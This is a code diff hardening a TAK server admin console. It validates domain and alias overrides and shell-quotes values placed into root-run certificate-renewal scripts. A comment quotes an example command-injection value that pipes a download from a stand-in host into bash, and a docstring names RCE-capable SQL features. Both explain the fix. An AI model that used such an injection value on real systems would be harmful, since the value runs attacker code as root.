@@ -392,7 +392,11 @@ def _pg_exec(args, timeout=30, input_text=None, input_bytes=None, capture_binary
     force-broker on root) _sudo_wrap returns the argv unchanged, so runuser runs
     directly — same result as the old sudo, no regression on root boxes. Returns
     the CompletedProcess (text unless capture_binary). NB: only for LOCAL pg; the
-    two-server SSH path still runs `sudo -u postgres` on the REMOTE box as root."""
+    two-server SSH path still runs `sudo -u postgres` on the REMOTE box as root.
+    SECURITY INVARIANT: never pass attacker-controlled SQL here. The broker bounds
+    `runuser -u postgres -- psql` to non-RCE SQL (_PSQL_FORBIDDEN) as defense in
+    depth, but that blocklist is not hermetic — every call site must use
+    console-authored, fixed SQL (no request-derived COPY/PROGRAM/language-C/etc.)."""
     # v10.0.1 container: the cot DB lives INSIDE the takserver-db container (a docker named
     # volume), NOT a host postgres cluster — `runuser -u postgres` on the host has no postgres
     # user/DB there. Run the tool inside the DB container as the postgres user (peer auth to the
@@ -15097,18 +15101,28 @@ def caddy_save_domains():
     aliases = data.get('aliases', {})
     settings = load_settings()
     fqdn = settings.get('fqdn', '')
+    # Validate every override/alias to the same FQDN/label shape the primary
+    # setters enforce (/api/caddy/domain, deploy). Without this a value like
+    # `x";curl evil|bash;"` flows verbatim through _get_service_domain into the
+    # root-run cert-renewal script (TAK_DOMAIN=…) and executes as root. The
+    # charset [a-zA-Z0-9.-] also makes the value shell-metacharacter-free.
+    _dom_re = r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'
     for key in SERVICE_DOMAIN_DEFAULTS:
         setting_key = f'{key}_domain' if key != 'mediamtx' else 'mediamtx_domain'
         alias_key = f'{key}_domain_alias'
         if key in domains:
-            val = domains[key].strip().lower()
+            val = (domains[key] or '').strip().lower()
+            if val and not re.match(_dom_re, val):
+                return jsonify({'success': False, 'error': f'Invalid domain/FQDN format for {key}'}), 400
             default_val = f'{SERVICE_DOMAIN_DEFAULTS[key]}.{fqdn}' if fqdn else ''
             if val and val != default_val:
                 settings[setting_key] = val
             elif setting_key in settings:
                 del settings[setting_key]
         if key in aliases:
-            av = aliases[key].strip().lower()
+            av = (aliases[key] or '').strip().lower()
+            if av and not re.match(_dom_re, av):
+                return jsonify({'success': False, 'error': f'Invalid alias format for {key}'}), 400
             if av:
                 settings[alias_key] = av
             elif alias_key in settings:
@@ -17974,9 +17988,9 @@ def _install_le_cert_on_8446_container(takserver_host, log_fn, wait_for_cert=Tru
     # re-import whenever TAK's keystore cert differs from Caddy's current cert).
     renewal = f'''#!/bin/bash
 set -euo pipefail
-TAK_DOMAIN="{takserver_host}"
-CERT_CRT="{cert_crt}"
-CERT_KEY="{cert_key}"
+TAK_DOMAIN={shlex.quote(takserver_host)}
+CERT_CRT={shlex.quote(cert_crt)}
+CERT_KEY={shlex.quote(cert_key)}
 P12={p12}
 JKS={jks}
 LOG=/var/log/takserver-cert-renewal.log
@@ -18177,9 +18191,9 @@ def install_le_cert_on_8446(takserver_host, log_fn, wait_for_cert=True):
 # picked up Caddy's renewed cert and its keystore cert silently expired.
 set -euo pipefail
 
-TAK_DOMAIN="{takserver_host}"
-CERT_CRT="{cert_crt}"
-CERT_KEY="{cert_key}"
+TAK_DOMAIN={shlex.quote(takserver_host)}
+CERT_CRT={shlex.quote(cert_crt)}
+CERT_KEY={shlex.quote(cert_key)}
 JKS="/opt/tak/certs/files/takserver-le.jks"
 LOG_FILE="/var/log/takserver-cert-renewal.log"
 
